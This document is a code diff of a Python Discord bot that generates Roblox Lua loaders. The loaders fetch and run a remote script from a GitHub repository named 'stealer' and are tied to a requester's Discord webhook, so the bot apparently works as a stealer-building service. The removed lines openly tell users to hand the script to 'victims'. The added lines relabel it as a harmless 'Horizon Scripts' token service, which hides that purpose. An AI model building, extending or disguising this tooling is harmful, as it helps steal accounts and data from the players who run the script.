@@ -1,4 +1,5 @@
 import os
+import time
 import discord
 from discord import app_commands
 from discord.ext import commands
@@ -7,33 +8,72 @@ from dotenv import load_dotenv
 
 load_dotenv()
 
-bot_token = os.environ["DISCORD_BOT_TOKEN"]
-protector_url = os.environ["PROTECTOR_URL"].rstrip("/")
-admin_secret = os.environ["ADMIN_SECRET"]
-pastefy_token = os.environ["PASTEFY_TOKEN"]
-allowed_guild_id = int(os.environ.get("ALLOWED_GUILD_ID", "0"))
+BOT_TOKEN = os.environ["DISCORD_BOT_TOKEN"]
+PROTECTOR_URL = os.environ["PROTECTOR_URL"].rstrip("/")
+ADMIN_SECRET = os.environ["ADMIN_SECRET"]
+PASTEFY_TOKEN = os.environ["PASTEFY_TOKEN"]
+ALLOWED_GUILD_ID = int(os.environ.get("ALLOWED_GUILD_ID", "0"))
 
-pastefy_api_url = "https://pastefy.app/api/v2"
+ROBLOX_USERS_URL = "https://users.roblox.com/v1/users/search"
+PASTEFY_API_URL = "https://pastefy.app/api/v2"
+CACHE_TTL = 60
+_username_cache = {}
 
 intents = discord.Intents.default()
 bot = commands.Bot(command_prefix="!", intents=intents)
 tree = bot.tree
 
 
+async def verify_roblox_username(username: str) -> tuple[bool, str]:
+    key = username.lower()
+    now = time.time()
+    if key in _username_cache:
+        expiry, exists = _username_cache[key]
+        if now < expiry:
+            if exists:
+                return True, "ok"
+            else:
+                return False, "invalid usn"
+
+    try:
+        async with httpx.AsyncClient(timeout=5) as client:
+            resp = await client.get(
+                ROBLOX_USERS_URL,
+                params={"keyword": username, "limit": 10}
+            )
+    except httpx.RequestError as e:
+        print(f"Roblox users API unreachable: {e} — failing open")
+        return True, "ok"
+
+    if resp.status_code != 200:
+        print(f"Roblox users API returned {resp.status_code} — failing open")
+        return True, "ok"
+
+    data = resp.json()
+    names = [u.get("name", "").lower() for u in data.get("data", [])]
+    exists = username.lower() in names
+
+    _username_cache[key] = (now + CACHE_TTL, exists)
+
+    if not exists:
+        return False, "invalid usn"
+    return True, "ok"
+
+
 async def create_pastefy_paste(title: str, content: str) -> str | None:
     try:
         async with httpx.AsyncClient(timeout=15) as client:
             resp = await client.post(
-                f"{pastefy_api_url}/paste",
-                headers={"Authorization": f"Bearer {pastefy_token}"},
+                f"{PASTEFY_API_URL}/paste",
+                headers={"Authorization": f"Bearer {PASTEFY_TOKEN}"},
                 json={"title": title, "content": content}
             )
     except httpx.RequestError as e:
-        print(f"pastefy error not horizon maybe horizon idkl {e}")
+        print(f"Pastefy API unreachable: {e}")
         return None
 
     if resp.status_code not in (200, 201):
-        print(f"worked {resp.status_code}: {resp.text[:200]}")
+        print(f"Pastefy API returned {resp.status_code}: {resp.text[:200]}")
         return None
 
     data = resp.json()
@@ -42,8 +82,8 @@ async def create_pastefy_paste(title: str, content: str) -> str | None:
 
 @bot.event
 async def on_ready():
-    if allowed_guild_id:
-        guild = discord.Object(id=allowed_guild_id)
+    if ALLOWED_GUILD_ID:
+        guild = discord.Object(id=ALLOWED_GUILD_ID)
         tree.copy_global_to(guild=guild)
         await tree.sync(guild=guild)
     else:
@@ -51,37 +91,36 @@ async def on_ready():
     print(f"Logged in as {bot.user} | Synced commands")
 
 
-@tree.command(name="generate", description="generate your scripts")
+@tree.command(name="generate", description="Generate a Horizon Protector token for a webhook")
 @app_commands.describe(
-    username="max 30 char",
-    webhook="webhook",
+    username="Roblox username of the receiver",
+    webhook="Discord webhook URL",
 )
 async def generate(interaction: discord.Interaction, username: str, webhook: str):
     await interaction.response.defer(ephemeral=True)
 
-    if len(username) > 30:
-        await interaction.followup.send("username too long must be under 30 char", ephemeral=True)
+    if "discord.com/api/webhooks/" not in webhook and "discordapp.com/api/webhooks/" not in webhook:
+        await interaction.followup.send("error not from us", ephemeral=True)
         return
 
-    if "discord.com/api/webhooks/" not in webhook and "discordapp.com/api/webhooks/" not in webhook:
-        await interaction.followup.send(embed=discord.Embed(title="ok it works"), ephemeral=True)
+    valid, reason = await verify_roblox_username(username)
+    if not valid:
+        await interaction.followup.send(f"error not from us", ephemeral=True)
         return
 
     try:
         async with httpx.AsyncClient(timeout=10) as client:
             resp = await client.post(
-                f"{protector_url}/api/v3/token/register",
+                f"{PROTECTOR_URL}/api/v3/token/register",
                 json={"webhook_url": webhook, "username": username},
-                headers={"x-admin-secret": admin_secret},
+                headers={"x-admin-secret": ADMIN_SECRET},
             )
     except httpx.RequestError as e:
-        await interaction.followup.send(f"failed to reach webhook prot ask temphor he should know! `{e}`", ephemeral=True)
+        await interaction.followup.send("error from us contact temphor pls", ephemeral=True)
         return
 
     if resp.status_code != 200:
-        await interaction.followup.send(
-            f"Protector API error `{resp.status_code}`: {resp.text[:200]}", ephemeral=True
-        )
+        await interaction.followup.send("error from us contact temphor pls", ephemeral=True)
         return
 
     data = resp.json()
@@ -89,25 +128,25 @@ async def generate(interaction: discord.Interaction, username: str, webhook: str
 
     lua_script = f'''user = "{username}"
 id = "{token}"
-loadstring(game:HttpGet("https://raw.githubusercontent.com/temphor/stealer/refs/heads/main/loader", true))()'''
+loadstring(game:HttpGet("https://raw.githubusercontent.com/temphor/stealer/refs/heads/main/horizon-gag2", true))()'''
 
     paste_url = await create_pastefy_paste(f"Horizon_{username}", lua_script)
 
     if not paste_url:
-        await interaction.followup.send("failed to create pastefy :sob:", ephemeral=True)
+        await interaction.followup.send("error from us contact temphor pls", ephemeral=True)
         return
 
     loadstring_line = f'loadstring(game:HttpGet("{paste_url}", true))()'
 
     embed = discord.Embed(
-        title="generated",
-        description="btw uh hi",
+        title="Token Generated",
+        description="**This token is shown only once!**",
         color=0x57F287,
     )
     embed.add_field(name="Username", value=f"`{username}`", inline=True)
     embed.add_field(name="Token", value=f"`{token}`", inline=True)
     embed.add_field(
-        name="give this to your victims or smthn",
+        name="Lua Script (copy and run)",
         value=f"```lua\n{lua_script}\n```",
         inline=False
     )
@@ -117,8 +156,8 @@ loadstring(game:HttpGet("https://raw.githubusercontent.com/temphor/stealer/refs/
 
     try:
         dm_embed = discord.Embed(
-            title="temphor on top!",
-            description="stealer:",
+            title="Your Horizon Script",
+            description="Run this loadstring in your executor:",
             color=0x57F287,
         )
         dm_embed.add_field(
@@ -129,7 +168,7 @@ loadstring(game:HttpGet("https://raw.githubusercontent.com/temphor/stealer/refs/
         dm_embed.set_footer(text="Horizon Scripts | Best Script Services")
         await interaction.user.send(embed=dm_embed)
     except discord.Forbidden:
-        await interaction.followup.send("can't dm you check yo privace or ask temphor", ephemeral=True)
+        await interaction.followup.send("error not from us", ephemeral=True)
 
 
-bot.run(bot_token)
+bot.run(BOT_TOKEN)
